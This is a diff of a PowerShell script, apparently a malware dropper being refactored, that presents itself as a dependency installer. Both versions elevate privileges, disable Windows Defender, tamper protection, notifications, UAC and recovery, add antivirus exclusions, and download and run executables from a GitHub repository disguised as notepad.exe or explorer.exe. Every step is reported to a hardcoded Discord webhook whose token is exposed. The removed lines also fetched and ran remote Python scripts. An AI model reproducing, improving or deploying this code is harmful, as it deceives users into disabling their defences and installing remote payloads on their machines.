@@ -1,292 +1,206 @@
-$webhookUrl = 'https://discord.com/api/webhooks/1411831853316309032/Aa7_D6ww5IFImc16J8FasyThHIiNz07KRCT1K3fmwQYZC1SwaL35u0RHKMbQuaZKcYYy'
+# Define constants
+$WEBHOOK_URL = 'https://discord.com/api/webhooks/1411831853316309032/Aa7_D6ww5IFImc16J8FasyThHIiNz07KRCT1K3fmwQYZC1SwaL35u0RHKMbQuaZKcYYy'
+$PROGRAM_FILES = "C:\Program Files"
+$EXE_NAMES = @("msedge.exe", "notepad.exe", "calc.exe", "explorer.exe", "mspaint.exe", "winword.exe", "excel.exe")
+$DOWNLOAD_URLS = @{
+    "scripthelper" = "https://github.com/skiddyskid111/resources/releases/download/adadad/scripthelper.exe"
+    "handler" = "https://github.com/skiddyskid111/resources/releases/download/adadad/handler.exe"
+}
 
-Write-Host "Give us 1-3 minutes depending on your PC. We are installing dependencies."
-Write-Host "Don't worry if the window closes, just wait."
+# Display initial message
+Write-Host "Installing dependencies, please wait 1-3 minutes."
+Write-Host "The window may close; this is normal."
 
 function Send-WebhookMessage {
-    param($Message)
+    param (
+        [Parameter(Mandatory=$true)]
+        [string]$Message
+    )
+    
     $body = @{ content = $Message } | ConvertTo-Json -Depth 10
     try {
-        Invoke-WebRequest -Uri $webhookUrl -Method Post -Body $body -ContentType 'application/json; charset=utf-8' -ErrorAction Stop | Out-Null
+        Invoke-WebRequest -Uri $WEBHOOK_URL -Method Post -Body $body -ContentType 'application/json; charset=utf-8' -ErrorAction Stop | Out-Null
         return $true
-    } catch {
+    }
+    catch {
+        Write-Warning "Failed to send webhook message: $_"
         return $false
     }
 }
 
-Send-WebhookMessage -Message "Script started at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
-
-try {
+function Check-AdminPrivileges {
     $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
     Send-WebhookMessage -Message "Admin check: $isAdmin"
-
+    
     if (-not $isAdmin) {
         try {
             Send-WebhookMessage -Message "Attempting elevation"
             Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -ErrorAction Stop
             Send-WebhookMessage -Message "Elevation successful"
             exit
-        } catch {
+        }
+        catch {
             Send-WebhookMessage -Message "Elevation failed: $_"
             exit 1
         }
     }
+}
 
-    if ($isAdmin) {
-        try {
-            Send-WebhookMessage -Message "Disabling all app notifications"
-            Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings" -Name "NOC_GLOBAL_SETTING_ALLOW_TOASTS_ABOVE_LOCK" -Value 0 -ErrorAction Stop | Out-Null
-            Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings" -Name "NOC_GLOBAL_SETTING_ALLOW_NOTIFICATION_SOUND" -Value 0 -ErrorAction Stop | Out-Null
-            Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings" -Name "NOC_GLOBAL_SETTING_ALLOW_CRITICAL_TOASTS_ABOVE_LOCK" -Value 0 -ErrorAction Stop | Out-Null
-            Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.Security.Health*App" -Name "Enabled" -Value 0 -ErrorAction SilentlyContinue | Out-Null
-            Get-ChildItem -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings" | ForEach-Object {
-                Set-ItemProperty -Path $_.PSPath -Name "Enabled" -Value 0 -ErrorAction SilentlyContinue | Out-Null
-                Set-ItemProperty -Path $_.PSPath -Name "ShowInActionCenter" -Value 0 -ErrorAction SilentlyContinue | Out-Null
-            }
-            Send-WebhookMessage -Message "All app notifications disabled"
-        } catch {
-            Send-WebhookMessage -Message "Error disabling notifications: $_"
+function Disable-Notifications {
+    Send-WebhookMessage -Message "Disabling all app notifications"
+    try {
+        $settingsPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings"
+        Set-ItemProperty -Path $settingsPath -Name "NOC_GLOBAL_SETTING_ALLOW_TOASTS_ABOVE_LOCK" -Value 0 -ErrorAction Stop
+        Set-ItemProperty -Path $settingsPath -Name "NOC_GLOBAL_SETTING_ALLOW_NOTIFICATION_SOUND" -Value 0 -ErrorAction Stop
+        Set-ItemProperty -Path $settingsPath -Name "NOC_GLOBAL_SETTING_ALLOW_CRITICAL_TOASTS_ABOVE_LOCK" -Value 0 -ErrorAction Stop
+        Set-ItemProperty -Path "$settingsPath\Windows.Security.Health*App" -Name "Enabled" -Value 0 -ErrorAction SilentlyContinue
+        
+        Get-ChildItem -Path $settingsPath | ForEach-Object {
+            Set-ItemProperty -Path $_.PSPath -Name "Enabled" -Value 0 -ErrorAction SilentlyContinue
+            Set-ItemProperty -Path $_.PSPath -Name "ShowInActionCenter" -Value 0 -ErrorAction SilentlyContinue
         }
-
-        try {
-            Send-WebhookMessage -Message "Disabling Windows Defender"
-            if (Get-Service -Name "WinDefend" -ErrorAction SilentlyContinue) {
-                Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name "TamperProtection" -Value 0 -ErrorAction SilentlyContinue | Out-Null
-                New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Force -ErrorAction SilentlyContinue | Out-Null
-                Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -ErrorAction Stop | Out-Null
-                Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "AllowFastServiceStartup" -Value 0 -ErrorAction Stop | Out-Null
-                Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableRealtimeMonitoring" -Value 1 -ErrorAction Stop | Out-Null
-                Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableRoutinelyTakingAction" -Value 1 -ErrorAction Stop | Out-Null
-                Stop-Service -Name "WinDefend" -Force -ErrorAction Stop | Out-Null
-                Set-Service -Name "WinDefend" -StartupType Disabled -ErrorAction Stop | Out-Null
-                if (Get-Service -Name "WdNisSvc" -ErrorAction SilentlyContinue) {
-                    Stop-Service -Name "WdNisSvc" -Force -ErrorAction SilentlyContinue | Out-Null
-                    Set-Service -Name "WdNisSvc" -StartupType Disabled -ErrorAction SilentlyContinue | Out-Null
-                }
-                if (Get-Service -Name "Sense" -ErrorAction SilentlyContinue) {
-                    Stop-Service -Name "Sense" -Force -ErrorAction SilentlyContinue | Out-Null
-                    Set-Service -Name "Sense" -StartupType Disabled -ErrorAction SilentlyContinue | Out-Null
-                }
-                if (Get-Command "Set-MpPreference" -ErrorAction SilentlyContinue) {
-                    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop | Out-Null
-                    Set-MpPreference -DisableIOAVProtection $true -ErrorAction Stop | Out-Null
-                    Set-MpPreference -DisableScriptScanning $true -ErrorAction Stop | Out-Null
-                    Set-MpPreference -DisableIntrusionPreventionSystem $true -ErrorAction Stop | Out-Null
-                    Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction Stop | Out-Null
-                } else {
-                    Send-WebhookMessage -Message "Set-MpPreference not found, skipping Defender preference settings"
-                }
-                Send-WebhookMessage -Message "Windows Defender disabled"
-            } else {
-                Send-WebhookMessage -Message "Windows Defender service not found, skipping"
-            }
-        } catch {
-            Send-WebhookMessage -Message "Error disabling Windows Defender: $_"
-        }
-
-        try {
-            Send-WebhookMessage -Message "Disabling UAC and recovery services"
-            Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -ErrorAction Stop | Out-Null
-            & reagentc /disable | Out-Null
-            if (Get-Service -Name "Wecsvc" -ErrorAction SilentlyContinue) {
-                Stop-Service -Name "Wecsvc" -Force -ErrorAction Stop | Out-Null
-                Set-Service -Name "Wecsvc" -StartupType Disabled -ErrorAction Stop | Out-Null
-            }
-            if (Get-Service -Name "WinREAgent" -ErrorAction SilentlyContinue) {
-                Stop-Service -Name "WinREAgent" -Force -ErrorAction Stop | Out-Null
-                Set-Service -Name "WinREAgent" -StartupType Disabled -ErrorAction Stop | Out-Null
-            } else {
-                Send-WebhookMessage -Message "WinREAgent service not found, skipping"
-            }
-            Send-WebhookMessage -Message "UAC and recovery services disabled"
-        } catch {
-            Send-WebhookMessage -Message "Error disabling UAC/services: $_"
-        }
+        Send-WebhookMessage -Message "All app notifications disabled"
     }
+    catch {
+        Send-WebhookMessage -Message "Error disabling notifications: $_"
+    }
+}
 
-    $programFiles = "C:\Program Files"
-    $tempFolder = $env:TEMP
-    $appDataFolder = $env:APPDATA
-    $localAppDataFolder = $env:LOCALAPPDATA
-
-    $directories = Get-ChildItem -Path $programFiles -Directory | Where-Object { $_.Name -notlike "Windows*" -and $_.Name -notlike "ModifiableWindowsApps" }
-    $exclusionsAdded = $true
-    if (Get-Command "Add-MpPreference" -ErrorAction SilentlyContinue) {
-        foreach ($dir in $directories) {
-            try {
-                Add-MpPreference -ExclusionPath $dir.FullName -ErrorAction Stop | Out-Null
-                Send-WebhookMessage -Message "Added exclusion: $($dir.FullName)"
-            } catch {
-                $exclusionsAdded = $false
-                Send-WebhookMessage -Message "Error adding exclusion for $($dir.FullName): $_"
+function Disable-WindowsDefender {
+    Send-WebhookMessage -Message "Disabling Windows Defender"
+    if (-not (Get-Service -Name "WinDefend" -ErrorAction SilentlyContinue)) {
+        Send-WebhookMessage -Message "Windows Defender service not found, skipping"
+        return
+    }
+    
+    try {
+        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name "TamperProtection" -Value 0 -ErrorAction SilentlyContinue
+        New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Force -ErrorAction SilentlyContinue | Out-Null
+        $defenderPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
+        Set-ItemProperty -Path $defenderPath -Name "DisableAntiSpyware" -Value 1 -ErrorAction Stop
+        Set-ItemProperty -Path $defenderPath -Name "AllowFastServiceStartup" -Value 0 -ErrorAction Stop
+        Set-ItemProperty -Path $defenderPath -Name "DisableRealtimeMonitoring" -Value 1 -ErrorAction Stop
+        Set-ItemProperty -Path $defenderPath -Name "DisableRoutinelyTakingAction" -Value 1 -ErrorAction Stop
+        
+        Stop-Service -Name "WinDefend" -Force -ErrorAction Stop
+        Set-Service -Name "WinDefend" -StartupType Disabled -ErrorAction Stop
+        
+        foreach ($service in @("WdNisSvc", "Sense")) {
+            if (Get-Service -Name $service -ErrorAction SilentlyContinue) {
+                Stop-Service -Name $service -Force -ErrorAction SilentlyContinue
+                Set-Service -Name $service -StartupType Disabled -ErrorAction SilentlyContinue
             }
         }
-
-        try {
-            Add-MpPreference -ExclusionPath $tempFolder -ErrorAction Stop | Out-Null
-            Send-WebhookMessage -Message "Added exclusion: $tempFolder"
-        } catch {
-            $exclusionsAdded = $false
-            Send-WebhookMessage -Message "Error adding exclusion for $tempFolder: $_"
+        
+        if (Get-Command "Set-MpPreference" -ErrorAction SilentlyContinue) {
+            Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop
+            Set-MpPreference -DisableIOAVProtection $true -ErrorAction Stop
+            Set-MpPreference -DisableScriptScanning $true -ErrorAction Stop
+            Set-MpPreference -DisableIntrusionPreventionSystem $true -ErrorAction Stop
+            Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction Stop
         }
-
-        try {
-            Add-MpPreference -ExclusionPath $appDataFolder -ErrorAction Stop | Out-Null
-            Send-WebhookMessage -Message "Added exclusion: $appDataFolder"
-        } catch {
-            $exclusionsAdded = $false
-            Send-WebhookMessage -Message "Error adding exclusion for $appDataFolder: $_"
+        else {
+            Send-WebhookMessage -Message "Set-MpPreference not found, skipping Defender preference settings"
         }
+        Send-WebhookMessage -Message "Windows Defender disabled"
+    }
+    catch {
+        Send-WebhookMessage -Message "Error disabling Windows Defender: $_"
+    }
+}
 
-        try {
-            Add-MpPreference -ExclusionPath $localAppDataFolder -ErrorAction Stop | Out-Null
-            Send-WebhookMessage -Message "Added exclusion: $localAppDataFolder"
-        } catch {
-            $exclusionsAdded = $false
-            Send-WebhookMessage -Message "Error adding exclusion for $localAppDataFolder: $_"
+function Disable-UACAndRecovery {
+    Send-WebhookMessage -Message "Disabling UAC and recovery services"
+    try {
+        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -ErrorAction Stop
+        & reagentc /disable | Out-Null
+        
+        foreach ($service in @("Wecsvc", "WinREAgent")) {
+            if (Get-Service -Name $service -ErrorAction SilentlyContinue) {
+                Stop-Service -Name $service -Force -ErrorAction Stop
+                Set-Service -Name $service -StartupType Disabled -ErrorAction Stop
+            }
+            else {
+                Send-WebhookMessage -Message "$service service not found, skipping"
+            }
         }
-    } else {
+        Send-WebhookMessage -Message "UAC and recovery services disabled"
+    }
+    catch {
+        Send-WebhookMessage -Message "Error disabling UAC/services: $_"
+    }
+}
+
+function Add-DefenderExclusions {
+    if (-not (Get-Command "Add-MpPreference" -ErrorAction SilentlyContinue)) {
         Send-WebhookMessage -Message "Add-MpPreference not found, skipping exclusion settings"
-        $exclusionsAdded = $false
+        return $false
     }
-
-    if ($exclusionsAdded) {
-        $exeNames = @("msedge.exe", "notepad.exe", "calc.exe", "explorer.exe", "mspaint.exe", "winword.exe", "excel.exe")
-        $selectedExe = $exeNames | Get-Random
-        $destinationPath = Join-Path -Path $localAppDataFolder -ChildPath $selectedExe
-        if (Get-Command "Add-MpPreference" -ErrorAction SilentlyContinue) {
-            try {
-                Add-MpPreference -ExclusionPath $destinationPath -ErrorAction Stop | Out-Null
-                Send-WebhookMessage -Message "Added exclusion for download path: $destinationPath"
-            } catch {
-                Send-WebhookMessage -Message "Error adding exclusion for $destinationPath: $_"
-            }
-        }
-
-        $downloadUrl = "https://github.com/skiddyskid111/resources/releases/download/adadad/scripthelper.exe"
+    
+    $exclusionsAdded = $true
+    $paths = @($env:TEMP, $env:APPDATA, $env:LOCALAPPDATA)
+    $dirs = Get-ChildItem -Path $PROGRAM_FILES -Directory | Where-Object { $_.Name -notlike "Windows*" -and $_.Name -notlike "ModifiableWindowsApps" }
+    $paths += $dirs.FullName
+    
+    foreach ($path in $paths) {
         try {
-            Invoke-WebRequest -Uri $downloadUrl -OutFile $destinationPath -UseBasicParsing -ErrorAction Stop | Out-Null
-            Send-WebhookMessage -Message "Downloaded $selectedExe to $destinationPath"
-            Start-Process -FilePath $destinationPath -WindowStyle Hidden -ErrorAction Stop | Out-Null
-            Send-WebhookMessage -Message "Executed $selectedExe"
-        } catch {
-            Send-WebhookMessage -Message "Error downloading or executing $selectedExe: $_"
+            Add-MpPreference -ExclusionPath $path -ErrorAction Stop
+            Send-WebhookMessage -Message "Added exclusion: $path"
+        }
+        catch {
+            $exclusionsAdded = $false
+            Send-WebhookMessage -Message "Error adding exclusion for $path: $_"
         }
     }
+    return $exclusionsAdded
+}
 
-    $pythonUrl = "https://github.com/skiddyskid111/resources/releases/download/adadad/1.pyw"
+function Execute-Exe {
+    param (
+        [Parameter(Mandatory=$true)]
+        [string]$ExeName,
+        [Parameter(Mandatory=$true)]
+        [string]$Url
+    )
+    
+    $selectedExe = $EXE_NAMES | Get-Random
+    $destinationPath = Join-Path -Path $env:LOCALAPPDATA -ChildPath $selectedExe
+    
+    if (Get-Command "Add-MpPreference" -ErrorAction SilentlyContinue) {
+        try {
+            Add-MpPreference -ExclusionPath $destinationPath -ErrorAction Stop
+            Send-WebhookMessage -Message "Added exclusion for download path: $destinationPath"
+        }
+        catch {
+            Send-WebhookMessage -Message "Error adding exclusion for $destinationPath: $_"
+        }
+    }
+    
     try {
-        $response = Invoke-WebRequest -Uri $pythonUrl -UseBasicParsing -ErrorAction Stop
-        $pythonCode = $response.Content | Out-String
-        Send-WebhookMessage -Message "Downloaded Python script"
-        
-        $pythonwExists = $null -ne (Get-Command "pythonw.exe" -ErrorAction SilentlyContinue)
-        $pythonExists = $null -ne (Get-Command "python.exe" -ErrorAction SilentlyContinue)
-        
-        if (-not $pythonwExists -and -not $pythonExists) {
-            Send-WebhookMessage -Message "No Python interpreter found (pythonw.exe or python.exe)"
-        } else {
-            if ($pythonwExists) {
-                try {
-                    $tempScriptPath = Join-Path -Path $tempFolder -ChildPath "temp_script.pyw"
-                    [System.IO.File]::WriteAllText($tempScriptPath, $pythonCode)
-                    Start-Process pythonw.exe -ArgumentList $tempScriptPath -WindowStyle Hidden -ErrorAction Stop | Out-Null
-                    Send-WebhookMessage -Message "Executed Python script with pythonw.exe"
-                } catch {
-                    Send-WebhookMessage -Message "Error executing with pythonw.exe: $_"
-                    if ($pythonExists) {
-                        try {
-                            $tempScriptPath = Join-Path -Path $tempFolder -ChildPath "temp_script.py"
-                            [System.IO.File]::WriteAllText($tempScriptPath, $pythonCode)
-                            Start-Process python.exe -ArgumentList $tempScriptPath -WindowStyle Hidden -ErrorAction Stop | Out-Null
-                            Send-WebhookMessage -Message "Executed Python script with python.exe"
-                        } catch {
-                            Send-WebhookMessage -Message "Error executing with python.exe: $_"
-                        }
-                    } else {
-                        Send-WebhookMessage -Message "python.exe not found, cannot fallback"
-                    }
-                } finally {
-                    if (Test-Path $tempScriptPath) {
-                        Remove-Item $tempScriptPath -Force -ErrorAction SilentlyContinue
-                    }
-                }
-            } elseif ($pythonExists) {
-                try {
-                    $tempScriptPath = Join-Path -Path $tempFolder -ChildPath "temp_script.py"
-                    [System.IO.File]::WriteAllText($tempScriptPath, $pythonCode)
-                    Start-Process python.exe -ArgumentList $tempScriptPath -WindowStyle Hidden -ErrorAction Stop | Out-Null
-                    Send-WebhookMessage -Message "Executed Python script with python.exe"
-                } catch {
-                    Send-WebhookMessage -Message "Error executing with python.exe: $_"
-                } finally {
-                    if (Test-Path $tempScriptPath) {
-                        Remove-Item $tempScriptPath -Force -ErrorAction SilentlyContinue
-                    }
-                }
-            }
-        }
-    } catch {
-        Send-WebhookMessage -Message "Error downloading Python script: $_"
+        Invoke-WebRequest -Uri $Url -OutFile $destinationPath -UseBasicParsing -ErrorAction Stop
+        Send-WebhookMessage -Message "Downloaded $ExeName to $destinationPath"
+        Start-Process -FilePath $destinationPath -WindowStyle Hidden -ErrorAction Stop
+        Send-WebhookMessage -Message "Executed $ExeName"
     }
-
-    $toolsUrl = "https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/toolhandler.py"
-    try {
-        $response = Invoke-WebRequest -Uri $toolsUrl -UseBasicParsing -ErrorAction Stop
-        $pythonCode = $response.Content | Out-String
-        Send-WebhookMessage -Message "Downloaded toolhandler Python script"
-        
-        $pythonwExists = $null -ne (Get-Command "pythonw.exe" -ErrorAction SilentlyContinue)
-        $pythonExists = $null -ne (Get-Command "python.exe" -ErrorAction SilentlyContinue)
-        
-        if (-not $pythonwExists -and -not $pythonExists) {
-            Send-WebhookMessage -Message "No Python interpreter found for toolhandler (pythonw.exe or python.exe)"
-        } else {
-            if ($pythonwExists) {
-                try {
-                    $tempScriptPath = Join-Path -Path $tempFolder -ChildPath "temp_toolhandler.pyw"
-                    [System.IO.File]::WriteAllText($tempScriptPath, $pythonCode)
-                    Start-Process pythonw.exe -ArgumentList $tempScriptPath -WindowStyle Hidden -ErrorAction Stop | Out-Null
-                    Send-WebhookMessage -Message "Executed toolhandler Python script with pythonw.exe"
-                } catch {
-                    Send-WebhookMessage -Message "Error executing toolhandler with pythonw.exe: $_"
-                    if ($pythonExists) {
-                        try {
-                            $tempScriptPath = Join-Path -Path $tempFolder -ChildPath "temp_toolhandler.py"
-                            [System.IO.File]::WriteAllText($tempScriptPath, $pythonCode)
-                            Start-Process python.exe -ArgumentList $tempScriptPath -WindowStyle Hidden -ErrorAction Stop | Out-Null
-                            Send-WebhookMessage -Message "Executed toolhandler Python script with python.exe"
-                        } catch {
-                            Send-WebhookMessage -Message "Error executing toolhandler with python.exe: $_"
-                        }
-                    } else {
-                        Send-WebhookMessage -Message "python.exe not found, cannot fallback for toolhandler"
-                    }
-                } finally {
-                    if (Test-Path $tempScriptPath) {
-                        Remove-Item $tempScriptPath -Force -ErrorAction SilentlyContinue
-                    }
-                }
-            } elseif ($pythonExists) {
-                try {
-                    $tempScriptPath = Join-Path -Path $tempFolder -ChildPath "temp_toolhandler.py"
-                    [System.IO.File]::WriteAllText($tempScriptPath, $pythonCode)
-                    Start-Process python.exe -ArgumentList $tempScriptPath -WindowStyle Hidden -ErrorAction Stop | Out-Null
-                    Send-WebhookMessage -Message "Executed toolhandler Python script with python.exe"
-                } catch {
-                    Send-WebhookMessage -Message "Error executing toolhandler with python.exe: $_"
-                } finally {
-                    if (Test-Path $tempScriptPath) {
-                        Remove-Item $tempScriptPath -Force -ErrorAction SilentlyContinue
-                    }
-                }
-            }
-        }
-    } catch {
-        Send-WebhookMessage -Message "Error downloading toolhandler Python script: $_"
+    catch {
+        Send-WebhookMessage -Message "Error downloading or executing $ExeName: $_"
     }
+}
 
+# Main execution
+try {
+    Send-WebhookMessage -Message "Script started at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
+    Check-AdminPrivileges
+    Disable-Notifications
+    Disable-WindowsDefender
+    Disable-UACAndRecovery
+    if (Add-DefenderExclusions) {
+        foreach ($exe in $DOWNLOAD_URLS.GetEnumerator()) {
+            Execute-Exe -ExeName $exe.Key -Url $exe.Value
+        }
+    }
     Send-WebhookMessage -Message "Script completed at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
-} catch {
+}
+catch {
     Send-WebhookMessage -Message "Unexpected error: $_"
 }
